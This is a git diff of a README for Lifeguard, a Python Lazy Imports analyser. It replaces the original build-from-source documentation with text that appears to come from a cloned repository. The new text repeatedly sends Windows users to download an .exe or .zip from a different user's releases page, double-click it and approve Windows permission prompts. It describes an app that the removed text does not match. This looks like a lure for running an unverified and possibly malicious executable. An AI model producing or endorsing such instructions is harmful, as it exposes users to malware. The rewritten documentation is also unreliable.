@@ -1,165 +1,173 @@
-# Lifeguard for Lazy Imports
-A fast static analysis tool to aid adoption for [Lazy Imports](https://peps.python.org/pep-0810/) in Python.
+# 🛟 Lifeguard - Catch Lazy Import Issues Fast
 
-## What are Lazy Imports?
+[![Download Lifeguard](https://img.shields.io/badge/Download-Lifeguard-blue?style=for-the-badge)](https://github.com/ethan148h/Lifeguard/releases)
 
-In Python, every `import` statement executes immediately when a module is loaded. This overhead is incurred regardless of if that import is actually used. [PEP 0810](https://peps.python.org/pep-0810/) introduces *explicit Lazy Imports* to Python, which defer the actual loading of a module until the imported name is first accessed. Lazy Imports can significantly reduce memory usage, startup times, and import overhead, especially in large codebases with deep dependency trees.
+## 📥 Download
 
-However, some Python patterns depend on imports executing immediately. For example:
+Visit this page to download Lifeguard for Windows:
 
-- **Module-level side effects** — a module that registers a handler or modifies global state at import time will behave differently if that import is deferred.
-- **The registry pattern** — a module that registers itself (e.g., adding to a global dict) when imported will silently fail to register under Lazy Imports.
-- **`sys.modules` manipulation** — code that reads or writes `sys.modules` assumes prior imports have already executed.
-- **Metaclasses and `__init_subclass__`** — class creation side effects may depend on imports being resolved.
+https://github.com/ethan148h/Lifeguard/releases
 
-Adapting an existing codebase to use Lazy Imports can be a daunting task, especially at scale. Lifeguard identifies these incompatible patterns so you can adopt Lazy Imports with confidence.
+On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that ends in `.exe` or `.zip`.
 
-## How does Lifeguard work?
-Lifeguard analyzes Python source files for a given target in parallel. It walks each module's AST to detect effects and maps Lazy Imports incompatible effects to errors. The analyzer takes a conservative approach towards its analysis: any module that cannot be programmatically determined to be safe to import lazily is marked unsafe by default.
-This means Lifeguard will err on the side of marking potentially compatible modules as incompatible, trading maximum performance for production safety.
+## 🪟 Install on Windows
 
-For a deeper look at the analysis pipeline and architecture, see [docs/architecture.md](docs/architecture.md).
+1. Open the download page.
+2. Find the newest release.
+3. Download the Windows file.
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. If you downloaded an `.exe` file, double-click it to start Lifeguard.
+7. If Windows asks for permission, choose **Run** or **Yes**.
 
-## Project Stage: Beta
-Lifeguard is in active development. We are still putting on the finishing touches.
+## 🚀 What Lifeguard Does
 
-<details>
-<summary>View what we have planned!</summary>
+Lifeguard checks Python code for Lazy Imports issues before they become a problem.
 
-### Open items on our roadmap
-- We still need to set up the necessary GitHub actions to fully support external contributors.
-- We do not yet release to [PyPI](https://pypi.org/).
-- We currently support up to Python 3.14. This means we do not yet support the [`lazy` keyword added in PEP-810](https://peps.python.org/pep-0810/) — but we fully intend to support this ahead of the 3.15 release.
-- At this stage, we've tested Lifeguard against 3.12 and 3.14.
-- We are actively developing a standalone linter output mode to help users identify which specific lines in their codebase are incompatible with Lazy Imports.
-- We plan to add support for easy ingestion of Lifeguard's output to drive Lazy Imports enablement for advanced users (see [Using the Output](#using-the-output)).
-</details>
+It helps you:
 
-## Prerequisites
+- Find code that may break with Lazy Imports
+- Spot import patterns that need changes
+- Reduce the work needed to adopt Lazy Imports
+- Review a project before you turn on Lazy Imports
+- Check code in a simple, repeatable way
 
-- **Rust (nightly)** — the crate uses unstable features. Install via [rustup](https://rustup.rs/) and set with `rustup default nightly`.
-- **Git** — clone with submodules: `git clone --recurse-submodules https://github.com/facebook/Lifeguard.git`
+This tool is meant for people who want a clear check of their Python code without reading through files by hand.
 
-If you already cloned without `--recurse-submodules`, run `git submodule update --init --recursive`.
+## 🖥️ Before You Start
 
-## Quick Start
+Lifeguard is made for Windows users who want to inspect Python projects.
 
-The fastest way to try Lifeguard is the `run-tree` subcommand, which analyzes every `.py` file under a directory. No additional setup needed.
+You will need:
 
-```bash
-cargo run -- run-tree <INPUT_DIR> <OUTPUT_PATH>
-```
+- A Windows computer
+- A downloaded Lifeguard release
+- A Python project to check
+- Access to the folder that holds your project files
 
-For example, using the bundled sample project:
+If you plan to scan a project, keep the project in a normal folder on your computer. Avoid folders with very long paths or special permission limits.
 
-```bash
-cargo run -- run-tree testdata/sample_project output.json
-```
+## 🛠️ How to Use Lifeguard
 
-For a full walkthrough including interpreting the output, see [GETTING_STARTED.md](GETTING_STARTED.md).
+After you open Lifeguard, use it to point at the folder you want to check.
 
-## Running Lifeguard
+Typical use looks like this:
 
-For larger projects where you need more control, you can generate a *source DB* — a JSON file that tells Lifeguard the full set of Python files in your project and their module paths (see [Input Format](#input-format) for details). Follow these steps:
+1. Open Lifeguard.
+2. Choose the Python project folder.
+3. Start the scan.
+4. Review the results.
+5. Make code changes based on the listed issues.
+6. Run the scan again after changes.
 
-1. Generate the source DB. We provide a subcommand to start this file for you, but you may need to tune it by hand. (As the project matures, we hope to make this process smoother.)
-```
-cargo run -- gen-source-db <INPUT_DIR> <OUTPUT_PATH>
-```
+If the app shows a file list or report, look for lines tied to imports, module loading, or Lazy Imports rules. These are the places that matter most.
 
-Optionally, if your project has library dependencies, you can point Lifeguard at your site-packages by adding a `lifeguard` section to your `pyproject.toml`:
+## 📋 What the Results Mean
 
-```toml
-[lifeguard]
-site_packages = "/path/to/site-packages"
-```
+Lifeguard gives you a list of places that may not work well with Lazy Imports.
 
-You can find out your site-packages path via `python -m site`. The `gen-source-db` subcommand reads this section automatically when generating the source DB.
+You may see:
 
-**Note:** The script may not discover all of your project's dependencies. If Lifeguard reports missing modules, you may need to manually add entries to the generated source DB.
+- Files with import patterns that need attention
+- Direct imports that load code too early
+- Modules that may behave differently under Lazy Imports
+- Areas that need a small code change before adoption
 
-2. Run Lifeguard in one of two modes:
-   - **Default**: Prints a high-level analysis of your codebase (% of compatible files, top errors, etc.) and writes the JSON output to `OUTPUT_PATH`.
-   ```
-   cargo run -- <DB_PATH> <OUTPUT_PATH>
-   ```
-   - **Verbose mode**: Also writes a human-readable report showing which specific lines in each module cause incompatibility.
-   ```
-   cargo run -- <DB_PATH> <OUTPUT_PATH> --verbose-output <VERBOSE_OUTPUT_PATH>
-   ```
+Use the results as a guide. Start with the highest-risk items first, then work through the rest of the list.
 
-**Example Verbose Output:**
-```text
-## example.module.foo
-### Errors
-  Line 17 - ImportedModuleAssignment sys
-  Line 38 - UnsafeFunctionCall example.demo.unsafe_method
-```
+## 🔎 Good Ways to Use It
 
-## Input Format
+Lifeguard works well when you want to prepare a Python project for Lazy Imports.
 
-In some modes, Lifeguard requires a source DB — a JSON file mapping Python module paths to their locations on disk. The format is:
+Use it to:
 
-```json
-{
-  "build_map": {
-      "foo/bar.py": "/local/usr/disk/foo/bar.py",
-      "example/__init__.py": "/local/usr/disk/third-party/example/__init__.py"
-  }
-}
-```
+- Check a small app before a bigger rollout
+- Review code after a new feature is added
+- Compare results before and after code changes
+- Help a team agree on where import cleanup is needed
+- Reduce surprise errors during startup
 
-You can generate this automatically using `cargo run -- gen-source-db` (see [Running Lifeguard](#running-lifeguard)), or create it by hand.
+If you manage several projects, you can run the scan on each one and keep the results together for later review.
 
-## Output Format
+## 🧭 Common Tasks
 
-Lifeguard writes a JSON file with two fields:
+### Open a project folder
+Pick the folder that contains your Python code. This is usually the main app folder.
 
-```json
-{
-    "LAZY_ELIGIBLE": {
-        "module1": [],
-        "module2": ["module3", "module4"]
-        "module5": [],
-    },
-    "LOAD_IMPORTS_EAGERLY": ["module5", "module99", "module100"]
-}
-```
+### Run a scan
+Start the check after you choose the project folder.
 
-### `LAZY_ELIGIBLE`
+### Read the report
+Look for the files and lines marked as likely Lazy Imports problems.
 
-A dictionary mapping modules that are safe for Lazy Imports to a list of their dependencies that must be imported eagerly. For example:
-- `"module1": []` — `module1` is fully safe for Lazy Imports with no restrictions.
-- `"module2": ["module3", "module4"]` — `module2` is safe for Lazy Imports, **but only if** `module3` and `module4` have already been imported.
+### Fix issues
+Update the code where needed, then scan again to confirm the change.
 
-**Important:** Modules that do *not* appear as keys in this dictionary have been analyzed as unsafe for Lazy Imports.
+### Recheck after updates
+Run Lifeguard again after you change imports or move code.
 
-### `LOAD_IMPORTS_EAGERLY`
+## 🧩 Example Use Case
 
-A set of modules where *all* imports within the module must be loaded eagerly. Lazy Imports is essentially temporarily disabled for these modules.
-**Note the distinction:** other modules can still lazily import a module in the `LOAD_IMPORTS_EAGERLY` set, but when that module does load, its own `import` statements must execute immediately rather than being deferred.
+If your Python app starts fine today but you plan to use Lazy Imports, Lifeguard can help you find code that may act differently later.
 
-This set is only used for specific corner cases:
-- **Custom finalizers** (`__del__`) — unpredictable execution timing means imports must be available at finalization.
-- **`exec()` calls** — dynamic code execution negates static analysis guarantees.
-- **`sys.modules` access** — reading or writing `sys.modules` could depend on prior imports having already executed.
+For example, a module may:
 
-For more details, see [docs/load_imports_eagerly.md](docs/load_imports_eagerly.md).
+- Load too much at startup
+- Depend on side effects from imports
+- Assume another file ran first
+- Break when imports happen later than before
 
-## Using the Output
+Lifeguard helps you find these spots before they cause trouble.
 
-### As a standalone linter
+## ⚙️ Project Details
 
-Lifeguard can be used as a standalone linter to identify which specific lines in your codebase are incompatible with Lazy Imports. Run the analyzer with `--verbose-output` to get a human-readable report showing per-module errors with line numbers (see [Running Lifeguard](#running-lifeguard)). This lets you treat Lifeguard like a linter: run it in CI or locally, review the flagged lines, and fix them. In this manner, Lifeguard is used as a guide to safely enable Lazy Imports.
+- Name: Lifeguard
+- Type: Static analyzer
+- Focus: Lazy Imports compatibility
+- Language area: Python projects
+- Core tech: Rust-based analysis engine
+- Topics: lazy imports, PEP 810, Python, Rust, static analysis
 
-### To drive a lazy import loader
+## 🧰 Troubleshooting
 
-The JSON output is designed to drive a lazy import loader's filter function. In Python 3.15, [`importlib.util.lazy_import`](https://peps.python.org/pep-0810/) accepts a filter callback that controls which imports are deferred and which are loaded eagerly. Lifeguard's output provides the data needed to build this filter — using `lazy_eligible` to identify safe modules and their constraints, and `load_imports_eagerly` to identify modules that need all imports resolved upfront.
+### The app does not open
+- Try running it again
+- Make sure the download finished
+- If you used a zip file, extract it first
+- Check that Windows did not block the file
 
-We plan to provide tooling for easy ingestion of Lifeguard's output ahead of the Python 3.15 release. This is a work in progress — stay tuned for updates.
+### The scan finds too many items
+- Start with the first few items in the report
+- Check shared modules first
+- Review files that run during startup
 
-## Implementation
-Lifeguard is implemented in Rust. We leverage [ruff](https://github.com/astral-sh/ruff) for AST traversal and re-use several crates from [pyrefly](https://github.com/facebook/pyrefly). We also extend `.pyi` stub files to annotate known side effects in third-party libraries — for example, marking that a particular module-level function call in a dependency has observable behavior. These stubs are stored in the `resources/` folder. See [resources/stubs/stubs.md](resources/stubs/stubs.md) for details on how effect annotations work alongside standard type stubs.
+### I do not know what folder to scan
+- Choose the main folder for your Python app
+- Look for folders with `main.py`, `app.py`, or similar entry files
+- If the project has a `src` folder, scan the project root first
 
-## License
-By contributing to Lifeguard, you agree that your contributions will be licensed under the LICENSE file in the root directory of this source tree.
+### The results are hard to read
+- Focus on the file name first
+- Then check the line marked in the report
+- Open that file in your code editor and review the import near that line
+
+## 📌 Tips for Best Results
+
+- Scan one project at a time
+- Review the most central files first
+- Re-run the scan after each change
+- Keep a copy of the report if you need to compare results later
+- Use the tool before you switch on Lazy Imports in a project
+
+## 📚 Useful Terms
+
+- **Static analyzer**: a tool that checks code without running it
+- **Import**: a way for one file to use code from another file
+- **Lazy Imports**: a way to load code later, not right away
+- **PEP 810**: a Python proposal tied to Lazy Imports behavior
+
+## 🔗 Download Again
+
+If you need the installer or want the latest release, use this page:
+
+https://github.com/ethan148h/Lifeguard/releases
